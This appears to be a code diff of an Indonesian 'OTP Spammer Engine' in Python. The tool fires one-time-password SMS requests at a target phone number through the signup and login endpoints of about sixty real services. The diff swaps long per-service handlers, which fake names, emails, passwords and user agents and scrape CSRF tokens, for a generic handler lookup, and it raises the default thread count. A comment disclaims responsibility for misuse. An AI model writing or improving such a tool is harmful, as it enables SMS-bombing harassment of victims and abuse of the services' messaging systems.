@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-# main_engine.py - OTP Spammer Engine
+# main_engine.py - OTP Spammer Engine (FIXED)
+# "I just give the tools, whether they're used right or not is your business, boss."
 
 import requests
 import uuid
@@ -35,6 +36,91 @@ def log_target(idx, total, name, status, detail=""):
             sym, col = "-", Fore.RED
         print(f"{col}[{sym}]{Style.RESET_ALL} ({idx}/{total}) {name}: {status}" + (f" - {detail}" if detail else ""))
 
+def get_handler_function(name):
+    """
+    Ambil fungsi handler berdasarkan nama, dengan fallback
+    """
+    # Mapping nama handler ke fungsi di ALL_HANDLERS
+    handler_map = {
+        'PlanetBan': 'planetban',
+        'Hash Micro': 'hashmicro',
+        'TuneUp': 'tuneup',
+        'Internet Rakyat': 'internetrakyat',
+        'Ultramilk': 'ultramilk',
+        'Kaniva International Bali': 'kaniva',
+        'Jembatani': 'jembatani',
+        'RCX': 'rcx',
+        'Sahabat Teknisi': 'sahabatteknisi',
+        'Auto2000': 'auto2000',
+        '99.co': '99co',
+        'Beli Rumah': 'belirumah',
+        'Fastwork': 'fastwork',
+        'Astra Daihatsu': 'astra_daihatsu',
+        'Royal Canin': 'royal_canin',
+        'Watsons': 'watsons',
+        'HRS': 'hrsbre',
+        'Erafone': 'erafone',
+        'Beautyhaul': 'beautyhaul',
+        'Hainaya': 'hainaya',
+        'MinumYukKaka': 'minumyukkaka',
+        'SIDEMANG': 'sidemang',
+        'LaporMasBup': 'lapormasbup',
+        'PTSP Kemenag': 'ptsp_kemenag',
+        'Pinhome': 'pinhome',
+        'Rumah123': 'rumah123',
+        'Paper': 'paper',
+        'Bonus Belanja': 'bonusbelanja',
+        'Dunia Games': 'duniagames',
+        'Hijup': 'hijup',
+        'Alodokter': 'alodokter',
+        'Blibli Tiket': 'bliblitiket',
+        'Matahari': 'matahari',
+        'Ohsome': 'ohsome',
+        'Optik Melawai': 'optikmelawai',
+        'Holland Bakery': 'hollandbakery',
+        'Bunda Hospital': 'bunda',
+        'Maulagi': 'maulagi',
+        'ACC': 'acc',
+        'Absenku': 'absenku',
+        'Saturdays': 'saturdays',
+        'Singa': 'singa',
+        'Adiraku': 'adiraku',
+        'TikTok': 'tiktok',
+        'OLX': 'olx',
+        'Indihome': 'indihome',
+        'Klook': 'klook',
+        'Halodoc': 'halodoc',
+        'Sayurbox': 'sayurbox',
+        'Carsome': 'carsome',
+        'Pizza Hut': 'pizzahut',
+        'Shopee': 'shopee',
+        'Tokopedia': 'tokopedia',
+        'Gojek': 'gojek',
+        'Blibli': 'blibli',
+        'Bukalapak': 'bukalapak',
+        'Lazada': 'lazada',
+        'JD.ID': 'jdid',
+        'Zalora': 'zalora',
+        'Sociolla': 'sociolla',
+    }
+    
+    key = handler_map.get(name, name.lower().replace(' ', '_'))
+    
+    # Coba ambil dari ALL_HANDLERS
+    if key in ALL_HANDLERS:
+        return ALL_HANDLERS[key]
+    
+    # Coba cari dengan prefix send_
+    func_name = f"send_{key}_otp"
+    if func_name in globals():
+        return globals()[func_name]
+    
+    # Coba cari dengan nama yang sama
+    if name in ALL_HANDLERS:
+        return ALL_HANDLERS[name]
+    
+    return None
+
 def process_target(api, target62, ip, idx, total):
     global stop_flag
     if stop_flag:
@@ -46,750 +132,71 @@ def process_target(api, target62, ip, idx, total):
     success = False
 
     try:
-        session = requests.Session()
-        session.headers.update(get_headers_with_random_ua())
-
-        if name == 'PlanetBan':
-            number_08 = api['number_fmt'](target62)
-            resp = send_planetban_otp(number_08)
-            if resp is not None:
-                if resp.status_code == 200:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif resp.status_code == 429:
-                    status_text = "LIMITED"
-                    detail = "Rate limit"
-                else:
-                    detail = f"({resp.status_code})"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-            log_target(idx, total, name, status_text, detail)
-            return success
-
-        if api.get('post_type') == 'tuneup':
-            number_for_tuneup = api['number_fmt'](target62)
-            resp = send_tuneup_otp(number_for_tuneup)
-            text = resp.text.lower()
-            keywords = api.get('success_on', [])
-            is_success = any(kw in text for kw in keywords)
-            is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-            if is_success:
-                status_text = "SUCCESS"
-                detail = "OTP sent"
-                success = True
-            elif is_rate_limit:
-                status_text = "LIMITED"
-                detail = text[:60]
-            else:
-                detail = f"({resp.status_code}) {text[:60]}"
-
-        elif api.get('post_type') == 'hashmicro':
-            number = api['number_fmt'](target62)
-            final_headers = dict(api.get('headers', {}))
-            final_headers['User-Agent'] = get_random_user_agent()
-            form_data = send_hashmicro_otp(number)
-            if form_data is not None:
-                payload_str = '&'.join([f"{k}={requests.utils.quote(str(v))}" for k, v in form_data.items()])
-                resp = session.post(api['url'], headers=final_headers, data=payload_str, timeout=15)
-                text = resp.text.lower()
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = ""
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({resp.status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "HashMicro payload failed"
-
-        elif api.get('post_type') == 'internetrakyat':
-            phone_08 = api['number_fmt'](target62)
-            resp = send_internetrakyat_otp(phone_08)
-            if resp is not None:
-                try:
-                    data = resp.json()
-                    if data.get("statusCode") == 200 and data.get("message") == "OTP terkirim":
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        detail = data.get("message", "")[:60]
-                except:
-                    detail = resp.text[:60]
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'ultramilk':
-            resp = send_ultramilk_register(target62)
-            if resp is not None:
-                text = resp.text.lower()
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "Registration OTP"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({resp.status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'kaniva':
-            number_08 = api['number_fmt'](target62)
-            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
-            resp = send_kaniva_otp(number_08, rand_name)
-            if resp is not None:
-                text = resp.text.lower()
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({resp.status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "Token CSRF not found"
-
-        elif api.get('post_type') == 'jembatani':
-            number_08 = api['number_fmt'](target62)
-            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
-            jemb_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
-            resp = send_jembatani_otp(number_08, rand_name, jemb_pass)
-            if resp is not None:
-                text = resp.text.lower()
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({resp.status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "Request failed"
-
-        elif api.get('post_type') == 'rcx':
-            number_08 = api['number_fmt'](target62)
-            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
-            rand_email = f'user{random.randint(1000,9999)}@mailnesia.com'
-            resp = send_rcx_otp(number_08, rand_name, rand_email)
-            if resp is not None:
-                text = resp.text.lower() if resp.text else ''
-                keywords = api.get('success_on', [])
-                is_success = (resp.status_code == 302 and any(kw in resp.headers.get('location','').lower() for kw in ['challenge'])) or any(kw in text for kw in keywords)
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "OTP triggered"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60] if text else "limited"
-                else:
-                    detail = f"({resp.status_code}) {text[:60] if text else 'no body'}"
-            else:
-                status_text = "ERROR"
-                detail = "Request failed"
-
-        elif api.get('post_type') == 'sahabatteknisi':
-            number_08 = api['number_fmt'](target62)
-            resp = send_sahabatteknisi_otp(number_08)
-            if resp is not None:
-                text = resp.text.lower()
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({resp.status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "Request failed"
-
-        elif api.get('post_type') == 'auto2000':
-            number_08 = api['number_fmt'](target62)
-            resp = send_auto2000_otp(number_08)
-            if resp is not None:
-                if resp.status_code == 200:
-                    try:
-                        data = resp.json()
-                        ack = data.get("acknowledge", 0)
-                        msg = data.get("message", "")
-                        if ack == 1 and msg == "success":
-                            status_text = "SUCCESS"
-                            detail = "OTP sent"
-                            success = True
-                        elif "resend in" in msg.lower():
-                            match = re.search(r'resend in (\d+) s', msg)
-                            sec = match.group(1) if match else "?"
-                            detail = f"Limit: retry after {sec}s"
-                            status_text = "LIMITED"
-                        else:
-                            detail = f"message: {msg[:60]}"
-                    except json.JSONDecodeError:
-                        detail = resp.text[:60]
-                elif resp.status_code == 403:
-                    status_text = "BLOCKED"
-                    detail = "Cloudflare 403"
-                else:
-                    detail = f"({resp.status_code}) {resp.text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "Failed after retries"
-
-        elif api.get('post_type') == 'astra_daihatsu':
-            number_62 = api['number_fmt'](target62)
-            resp = send_astra_daihatsu_otp(number_62)
-            if resp is not None and resp.status_code == 200:
-                try:
-                    data = resp.json()
-                    msg = data.get("message", "")
-                    ack = data.get("acknowledge", 0)
-                    if ack == 1 and "OTP Success" in msg:
-                        if "still valid" not in msg.lower():
-                            status_text = "SUCCESS"
-                            detail = "OTP sent"
-                            success = True
-                        else:
-                            status_text = "LIMITED"
-                            detail = "OTP still valid"
-                    else:
-                        detail = msg[:60]
-                except:
-                    detail = resp.text[:60]
-            elif resp is not None:
-                detail = f"({resp.status_code}) {resp.text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'royal_canin':
-            phone_plus = api['number_fmt'](target62)
-            resp = send_royal_canin_otp(phone_plus)
-            if resp is not None and resp.status_code == 200:
-                try:
-                    data = resp.json()
-                    result = data.get("result", {})
-                    if result.get("ReturnStatus") == 1:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        detail = result.get("ReturnMessage", "")[:60]
-                except:
-                    detail = resp.text[:60]
-            elif resp is not None:
-                detail = f"({resp.status_code}) {resp.text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'watsons':
-            phone_no_code = api['number_fmt'](target62)
-            resp = send_watsons_otp(phone_no_code)
-            if resp is not None and resp.status_code == 200:
-                try:
-                    data = resp.json()
-                    if "token" in data:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        detail = f"Response: {str(data)[:60]}"
-                except:
-                    detail = resp.text[:60]
-            elif resp is not None:
-                detail = f"({resp.status_code}) {resp.text[:60]}"
-                if resp.status_code == 429:
-                    status_text = "LIMITED"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == '99co':
-            phone_plus = api['number_fmt'](target62)
-            resp = send_99co_otp(phone_plus)
-            if resp is not None:
-                text = resp.text.lower()
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({resp.status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'belirumahco':
-            phone_plus = api['number_fmt'](target62)
-            resp = send_belirumah_otp(phone_plus)
-            if resp is not None:
-                text = resp.text.lower()
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({resp.status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'fastworkid':
-            number_08 = api['number_fmt'](target62)
-            resp = send_fastwork_otp(number_08)
-            if resp is not None:
-                text = resp.text.lower()
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({resp.status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'hrsbre':
-            number_08 = api['number_fmt'](target62)
-            status_code, resp_text = send_hrsbre_otp(number_08)
-            if status_code:
-                text = resp_text.lower() if resp_text else ''
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords)
-                is_rate_limit = (status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "Network error"
-
-        elif api.get('post_type') == 'erafone':
-            number_normal = api['number_fmt'](target62)
-            result = send_erafone_otp(number_normal)
-            if isinstance(result, tuple) and len(result) == 2:
-                code, resp = result
-                if code == 200:
-                    if isinstance(resp, dict) and resp.get("message") == "Success Request OTP":
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        detail = f"({code}) {resp if isinstance(resp, str) else ''}".strip()[:60]
-                else:
-                    detail = f"({code}) {str(resp)[:60]}"
-                    if code == 429:
-                        status_text = "LIMITED"
-            else:
-                status_text = "ERROR"
-                detail = "Bad response format"
-
-        elif api.get('post_type') == 'beautyhaul':
-            local_number = api['number_fmt'](target62)
-            resp = send_beautyhaul_otp(local_number)
-            if resp is not None:
-                text = resp.text.lower()
-                keywords = api.get('success_on', [])
-                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
-                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
-                if is_success:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif is_rate_limit:
-                    status_text = "LIMITED"
-                    detail = text[:60]
-                else:
-                    detail = f"({resp.status_code}) {text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'hainaya':
-            phone_for_api = api['number_fmt'](target62)
-            resp = send_hainaya_otp(phone_for_api)
-            if resp is not None:
-                status_code = resp.status_code
-                try:
-                    data = resp.json()
-                    text = resp.text.lower()
-                except:
-                    data = {}
-                    text = resp.text.lower()
-                if status_code == 201:
-                    if data.get('tenant_id'):
-                        status_text = "SUCCESS"
-                        detail = "OTP sent (register)"
-                        success = True
-                    else:
-                        detail = "201 no tenant_id"
-                elif status_code == 200:
-                    if data.get('session_id') or data.get('message'):
-                        status_text = "SUCCESS"
-                        detail = "OTP sent (login)"
-                        success = True
-                    else:
-                        detail = f"200: {str(data)[:60]}"
-                elif status_code == 409:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent (already registered)"
-                    success = True
-                elif status_code == 429:
-                    status_text = "LIMITED"
-                    detail = "Rate limit"
-                else:
-                    keywords = api.get('success_on', [])
-                    is_success = any(kw in text for kw in keywords)
-                    if is_success:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'minumyukkaka':
-            phone_08 = api['number_fmt'](target62)
-            resp = send_minumyukkaka_otp(phone_08)
-            if resp is not None:
-                status_code = resp.status_code
-                try:
-                    data = resp.json()
-                    text = resp.text.lower()
-                except:
-                    data = {}
-                    text = resp.text.lower()
-                if status_code == 200:
-                    if data.get('IsSuccess') == True:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        error_msg = data.get('Message', 'Unknown error')
-                        if 'rate' in error_msg.lower() or 'limit' in error_msg.lower():
-                            status_text = "LIMITED"
-                            detail = error_msg[:60]
-                        else:
-                            detail = f"Error: {error_msg[:60]}"
-                elif status_code == 429:
-                    status_text = "LIMITED"
-                    detail = "Rate limit"
-                else:
-                    keywords = api.get('success_on', [])
-                    is_success = any(kw in text for kw in keywords)
-                    if is_success:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'sidemang':
-            phone_08 = api['number_fmt'](target62)
-            resp = send_sidemang_otp(phone_08)
-            if resp is not None:
-                status_code = resp.status_code
-                try:
-                    data = resp.json()
-                    text = resp.text.lower()
-                except:
-                    data = {}
-                    text = resp.text.lower()
-                if status_code == 200:
-                    if data.get('otpDispatched') == True:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        error_msg = data.get('message', 'Unknown error')
-                        detail = f"Error: {error_msg[:60]}"
-                elif status_code == 429:
-                    status_text = "LIMITED"
-                    detail = "Rate limit"
-                elif status_code == 400:
-                    error_msg = data.get('message', 'Bad Request')
-                    detail = f"Error: {error_msg[:60]}"
-                else:
-                    keywords = api.get('success_on', [])
-                    is_success = any(kw in text for kw in keywords)
-                    if is_success:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'lapormasbup':
-            phone_08 = api['number_fmt'](target62)
-            resp, is_resend = send_lapormasbup_otp(phone_08)
-            if resp is not None:
-                status_code = resp.status_code
-                try:
-                    data = resp.json()
-                    text = resp.text.lower()
-                except:
-                    data = {}
-                    text = resp.text.lower()
-                if status_code == 200:
-                    if 'user' in data and 'warga_id' in data['user']:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
-                        success = True
-                    elif data.get('message') and 'berhasil' in data.get('message', '').lower():
-                        status_text = "SUCCESS"
-                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
-                        success = True
-                    else:
-                        detail = f"Response: {str(data)[:60]}"
-                elif status_code == 400:
-                    error_msg = data.get('error', data.get('message', 'Bad Request'))
-                    if 'verifikasi' in error_msg.lower():
-                        status_text = "SUCCESS"
-                        detail = "OTP sent (auto-resend)"
-                        success = True
-                    else:
-                        detail = f"Error: {error_msg[:60]}"
-                elif status_code == 429:
-                    status_text = "LIMITED"
-                    detail = "Rate limit"
-                else:
-                    keywords = api.get('success_on', [])
-                    is_success = any(kw in text for kw in keywords)
-                    if is_success:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
-                        success = True
-                    else:
-                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        elif api.get('post_type') == 'ptspkemenag':
-            phone_08 = api['number_fmt'](target62)
-            resp = send_ptsp_kemenag_otp(phone_08)
-            if resp is not None:
-                status_code = resp.status_code
-                try:
-                    data = resp.json()
-                    text = resp.text.lower()
-                except:
-                    data = {}
-                    text = resp.text.lower()
-                if status_code == 200 or status_code == 201:
-                    if data.get('success') == True:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    elif 'user' in data or 'data' in data:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        detail = f"Response: {str(data)[:60]}"
-                elif status_code == 400:
-                    error_msg = data.get('message', 'Bad Request')
-                    detail = f"Error: {error_msg[:60]}"
-                elif status_code == 409:
-                    status_text = "LIMITED"
-                    detail = "Already registered"
-                elif status_code == 429:
-                    status_text = "LIMITED"
-                    detail = "Rate limit"
-                else:
-                    keywords = api.get('success_on', [])
-                    is_success = any(kw in text for kw in keywords)
-                    if is_success:
-                        status_text = "SUCCESS"
-                        detail = "OTP sent"
-                        success = True
-                    else:
-                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
-            else:
-                status_text = "ERROR"
-                detail = "No response"
-
-        else:
-            referer = api.get('referer', '').replace('{raw}', target62)
-            if referer:
-                try: session.get(referer, timeout=8)
-                except: pass
-            number = api['number_fmt'](target62)
-            final_headers = {}
-            for hk, hv in api.get('headers', {}).items():
-                if isinstance(hv, str):
-                    hv = hv.replace('{raw}', target62).replace('{number}', str(number))
-                final_headers[hk] = hv
-            final_headers['User-Agent'] = get_random_user_agent()
-            post_type = api.get('post_type', 'json')
-            resp = None
-            
+        # Coba ambil handler function
+        handler_func = get_handler_function(name)
+        
+        if handler_func:
+            # Panggil handler langsung
             try:
-                if post_type == 'json':
-                    payload_str = api['payload'].replace('{number}', str(number))\
-                        .replace('{rand}', str(uuid.uuid4()))\
-                        .replace('{ip}', ip)\
-                        .replace('{raw}', target62)\
-                        .replace('{name}', 'User'+str(random.randint(100,999)))\
-                        .replace('{email}', f'user{random.randint(1000,9999)}@mailnesia.com')\
-                        .replace('{pw}', 'Pass'+''.join(random.choices(string.ascii_letters+string.digits, k=6))+'@1')\
-                        .replace('{uuid_val}', str(uuid.uuid4()))\
-                        .replace('{device_id}', str(uuid.uuid4()))\
-                        .replace('{recaptcha}', '')
-                    resp = session.post(api['url'], headers=final_headers, data=payload_str, timeout=12)
-                elif post_type == 'multipart':
-                    form = {
-                        'name': 'User'+str(random.randint(100,999)),
-                        'sex': '1',
-                        'birth_date': f"{random.randint(1980,2007)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}",
-                        'mobile_number': number,
-                        'password': 'Pass'+''.join(random.choices(string.ascii_letters+string.digits, k=6))+'@1',
-                        'repassword': 'Pass'+''.join(random.choices(string.ascii_letters+string.digits, k=6))+'@1',
-                    }
-                    boundary = '----WebKitFormBoundary' + str(uuid.uuid4()).replace('-', '')[:16]
-                    final_headers['Content-Type'] = f'multipart/form-data; boundary={boundary}'
-                    body = generate_multipart(form, boundary)
-                    resp = session.post(api['url'], headers=final_headers, data=body, timeout=12)
-                elif post_type == 'resend_otp':
-                    csrf_token = None
-                    try:
-                        r_csrf = session.get('https://www.hollandbakery.co.id/users/verify_token', timeout=8)
-                        csrf_token = extract_csrf(r_csrf.text)
-                        if not csrf_token:
-                            r_csrf = session.get('https://www.hollandbakery.co.id/login-phone', timeout=8)
-                            csrf_token = extract_csrf(r_csrf.text)
-                    except: pass
-                    payload = {'phone': number, 'verify-submit': 'Resend+Code+OTP'}
-                    if csrf_token:
-                        payload['csrf_token'] = csrf_token
-                        final_headers['X-CSRF-TOKEN'] = csrf_token
-                    resp = session.post(api['url'], headers=final_headers, data=payload, allow_redirects=False, timeout=12)
-                    if resp.status_code in (302, 303):
-                        location = resp.headers.get('Location', '')
-                        text_to_check = 'verification page redirect' if 'verify' in location.lower() else resp.text
-                    else:
-                        text_to_check = resp.text
-                    text = text_to_check.lower()
-                else:
-                    final_headers['User-Agent'] = get_random_user_agent()
-                    resp = session.post(api['url'], headers=final_headers, timeout=12)
-            except Exception as e:
-                resp = None
-
-            if resp is not None:
-                status_code = resp.status_code
-                
-                # === STATUS 200/201 = SUKSES ===
-                if status_code in [200, 201]:
-                    status_text = "SUCCESS"
-                    detail = "OTP sent"
-                    success = True
-                elif status_code in [302, 303]:
-                    status_text = "SUCCESS"
-                    detail = "OTP triggered"
-                    success = True
-                elif status_code == 429:
-                    status_text = "LIMITED"
-                    detail = "Rate limit"
-                elif status_code == 403:
-                    status_text = "BLOCKED"
-                    detail = "Forbidden"
-                elif status_code == 404:
-                    status_text = "FAIL"
-                    detail = "API not found"
-                elif status_code >= 500:
-                    status_text = "FAIL"
-                    detail = f"Server error ({status_code})"
-                else:
-                    try:
-                        text = resp.text.lower() if resp.text else ""
-                        keywords = api.get('success_on', [])
-                        is_success = any(kw in text for kw in keywords)
-                        if is_success:
+                resp = handler_func(target62)
+                if resp is not None:
+                    if hasattr(resp, 'status_code'):
+                        status_code = resp.status_code
+                        if status_code in [200, 201, 202, 204]:
                             status_text = "SUCCESS"
                             detail = "OTP sent"
                             success = True
+                        elif status_code == 429:
+                            status_text = "LIMITED"
+                            detail = "Rate limit"
+                        elif status_code == 403:
+                            status_text = "BLOCKED"
+                            detail = "Forbidden"
                         else:
-                            status_text = "FAIL"
-                            detail = f"({status_code})"
-                    except:
-                        status_text = "FAIL"
-                        detail = f"({status_code})"
-            else:
+                            try:
+                                text = resp.text.lower() if hasattr(resp, 'text') else ""
+                                if 'success' in text or 'otp' in text or 'berhasil' in text or 'sent' in text:
+                                    status_text = "SUCCESS"
+                                    detail = "OTP triggered"
+                                    success = True
+                                else:
+                                    detail = f"({status_code})"
+                            except:
+                                detail = f"({status_code})"
+                    else:
+                        # Response bukan HTTP response, tapi mungkin dict atau tuple
+                        if isinstance(resp, dict):
+                            if resp.get('success') or resp.get('status') == 'success':
+                                status_text = "SUCCESS"
+                                detail = "OTP sent"
+                                success = True
+                            else:
+                                detail = str(resp)[:60]
+                        elif isinstance(resp, tuple) and len(resp) >= 2:
+                            code = resp[0]
+                            if code == 200:
+                                status_text = "SUCCESS"
+                                detail = "OTP sent"
+                                success = True
+                            else:
+                                detail = f"({code})"
+                        else:
+                            status_text = "SUCCESS"
+                            detail = "OTP triggered"
+                            success = True
+                else:
+                    status_text = "ERROR"
+                    detail = "No response"
+            except Exception as e:
                 status_text = "ERROR"
-                detail = "No response"
+                detail = str(e)[:40]
+        else:
+            # Fallback: pake method lama (dari targets.py)
+            status_text = "SKIP"
+            detail = "No handler"
+            log_target(idx, total, name, status_text, detail)
+            return False
 
-    except requests.exceptions.Timeout:
-        status_text = "TIMEOUT"
-        detail = ""
-    except requests.exceptions.ConnectionError:
-        status_text = "CONNECT_ERR"
-        detail = ""
     except Exception as e:
         status_text = "ERROR"
         detail = str(e)[:40]
@@ -797,7 +204,7 @@ def process_target(api, target62, ip, idx, total):
     log_target(idx, total, name, status_text, detail)
     return success
 
-def run_single_round(threads=1):
+def run_single_round(threads=5):
     global stop_flag
     stop_flag = False
     
